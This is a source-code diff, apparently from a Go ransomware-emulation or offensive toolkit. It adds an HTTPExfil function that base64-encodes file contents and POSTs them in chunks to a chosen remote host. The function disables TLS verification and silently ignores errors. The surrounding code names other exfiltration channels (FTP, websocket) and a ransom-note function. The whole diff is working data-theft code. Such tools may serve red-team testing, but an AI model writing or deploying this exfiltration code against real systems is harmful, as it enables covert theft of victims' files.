@@ -24,6 +24,7 @@ import (
 	ws "github.com/gorilla/websocket"
 	"github.com/mjwhitta/errors"
 	"github.com/mjwhitta/ftp"
+	"github.com/mjwhitta/inet"
 )
 
 // DefaultEncrypt is the default encryption behavior.
@@ -321,6 +322,72 @@ func FTPParallelExfil(dst, user, passwd string) (ExfilFunc, error) {
 	return f, nil
 }
 
+// HTTPExfil will return a function pointer to an ExfilFunc that
+// exfils via HTTP POST requests with the specified headers.
+func HTTPExfil(
+	dst string,
+	headers map[string]string,
+) (ExfilFunc, error) {
+	var f ExfilFunc = func(path string, b []byte) error {
+		var b64 string
+		var data []byte
+		var e error
+		var n int
+		var req *http.Request
+		var stream *bytes.Reader = bytes.NewReader(b)
+		var tmp [4 * 1024 * 1024]byte
+
+		if t, ok := http.DefaultTransport.(*http.Transport); ok {
+			if t.TLSClientConfig == nil {
+				t.TLSClientConfig = &tls.Config{}
+			}
+
+			t.TLSClientConfig.InsecureSkipVerify = true
+		}
+
+		// Set timeout to 1 second
+		inet.DefaultClient.Timeout(time.Second)
+
+		for {
+			if n, e = stream.Read(tmp[:]); (n == 0) && (e == io.EOF) {
+				return nil
+			} else if e != nil {
+				return errors.Newf("failed to read data: %w", e)
+			}
+
+			// Create request body
+			b64 = base64.StdEncoding.EncodeToString(tmp[:n])
+
+			if path != "" {
+				data = []byte(path + " " + b64)
+			} else {
+				data = []byte(b64)
+			}
+
+			// Create request
+			req, e = http.NewRequest(
+				http.MethodPost,
+				dst,
+				bytes.NewBuffer(data),
+			)
+			if e != nil {
+				e = errors.Newf("failed to craft HTTP request: %w", e)
+				return e
+			}
+
+			// Set headers
+			for k, v := range headers {
+				req.Header.Set(k, v)
+			}
+
+			// Send Message and ignore response or errors
+			inet.DefaultClient.Do(req)
+		}
+	}
+
+	return f, nil
+}
+
 // RansomNote will return a function pointer to a NotifyFunc that
 // appends the specified text to the specified file.
 func RansomNote(path string, text ...string) NotifyFunc {
@@ -468,7 +535,7 @@ func WebsocketExfil(
 	var dialer *ws.Dialer
 	var e error
 	var f ExfilFunc
-	var hdrs http.Header = map[string][]string{}
+	var hdrs http.Header
 	var m *sync.Mutex = &sync.Mutex{}
 	var tmp *url.URL
 
@@ -526,7 +593,7 @@ func WebsocketParallelExfil(
 	var dialer *ws.Dialer
 	var e error
 	var f ExfilFunc
-	var hdrs http.Header = map[string][]string{}
+	var hdrs http.Header
 	var tmp *url.URL
 
 	// Set headers
